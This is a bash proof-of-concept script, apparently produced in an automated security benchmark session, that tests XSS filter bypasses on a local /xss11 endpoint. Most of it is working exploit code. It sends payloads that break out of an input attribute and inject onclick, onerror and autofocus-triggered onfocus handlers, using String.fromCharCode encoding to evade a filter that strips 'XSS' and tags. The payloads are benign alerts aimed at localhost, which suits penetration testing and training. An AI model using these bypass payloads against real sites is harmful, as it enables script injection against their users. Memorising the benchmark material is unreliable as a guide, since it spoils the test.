#!/bin/bash
# POC: Demonstrates XSS filter bypass on /xss11 endpoint using event handler injection with String.fromCharCode encoding
# Target: ./repo
# Created: 2025-11-06T19:21:03.768Z
# Session: benchmark-XBEN-012-24-mhnsyuvd

# XSS11 Filter Bypass POC - Event Handler Injection with Character Code Encoding
# This POC demonstrates bypassing the XSS filters on the /xss11 endpoint
# Filters: 1) Removes "XSS" or 'XSS' (case insensitive), 2) Removes < followed by a-z or /

TARGET="http://localhost:5000"
ENDPOINT="/xss11"

echo "=== XSS11 Filter Bypass Proof of Concept ==="
echo ""

# Test 1: Basic onclick bypass with String.fromCharCode
echo "[*] Test 1: Basic onclick bypass with String.fromCharCode encoding"
PAYLOAD1="\" onclick=\"alert(String.fromCharCode(88,83,83))"
echo "    Payload: $PAYLOAD1"
RESPONSE1=$(curl -s "${TARGET}${ENDPOINT}?name=${PAYLOAD1}" | grep -o 'onclick="alert(String.fromCharCode(88,83,83))')
if [ -n "$RESPONSE1" ]; then
    echo "    ✓ VULNERABLE: Event handler found in response"
    echo "    Response contains: $RESPONSE1"
else
    echo "    ✗ Filtered or response not matching expected pattern"
fi
echo ""

# Test 2: HTML entity bypass (&#39; for apostrophe)
echo "[*] Test 2: HTML entity bypass with &#39; encoding"
PAYLOAD2="\" onerror=\"alert(&#39;XSS&#39;)\" x=\""
echo "    Payload: $PAYLOAD2"
RESPONSE2=$(curl -s "${TARGET}${ENDPOINT}?name=${PAYLOAD2}" | grep -o 'onerror="alert(&#39;XSS&#39;)"')
if [ -n "$RESPONSE2" ]; then
    echo "    ✓ VULNERABLE: Event handler found in response"
    echo "    Response contains: $RESPONSE2"
else
    echo "    ✗ Filtered or response not matching expected pattern"
fi
echo ""

# Test 3: Autofocus + onfocus bypass
echo "[*] Test 3: Autofocus + onfocus auto-trigger bypass"
PAYLOAD3="\" onfocus=\"alert(String.fromCharCode(88,83,83))\" autofocus x=\""
echo "    Payload: $PAYLOAD3"
RESPONSE3=$(curl -s "${TARGET}${ENDPOINT}?name=${PAYLOAD3}" | grep -o 'onfocus="alert(String.fromCharCode(88,83,83))"')
if [ -n "$RESPONSE3" ]; then
    echo "    ✓ VULNERABLE: Event handler found in response"
    echo "    Response contains: $RESPONSE3"
else
    echo "    ✗ Filtered or response not matching expected pattern"
fi
echo ""

# Test 4: Full HTML response analysis
echo "[*] Test 4: Full HTML response analysis for first payload"
echo "    Making request to: ${TARGET}${ENDPOINT}?name=${PAYLOAD1}"
FULL_RESPONSE=$(curl -s "${TARGET}${ENDPOINT}?name=${PAYLOAD1}")
echo "    Response snippet (searching for input value):"
echo "$FULL_RESPONSE" | grep -o '<input value="[^"]*"[^>]*>' | head -1
echo ""

# Test 5: Verify filter bypass - checking if XSS string appears in unencoded form
echo "[*] Test 5: Verify actual XSS text bypass with different encoding"
PAYLOAD5="\" onclick=\"alert(String.fromCharCode(88,83,83))\" x=\""
echo "    Payload: $PAYLOAD5"
RESPONSE5=$(curl -s "${TARGET}${ENDPOINT}?name=${PAYLOAD5}")
if echo "$RESPONSE5" | grep -q "onclick="; then
    echo "    ✓ VULNERABLE: onclick event handler successfully injected"
    echo "    Filter did not block the event handler attribute"
else
    echo "    ✗ Filter appears to have removed the event handler"
fi
echo ""

echo "=== POC Completed ==="
echo "If tests 1, 3, or 5 show VULNERABLE, the XSS filter bypass is confirmed."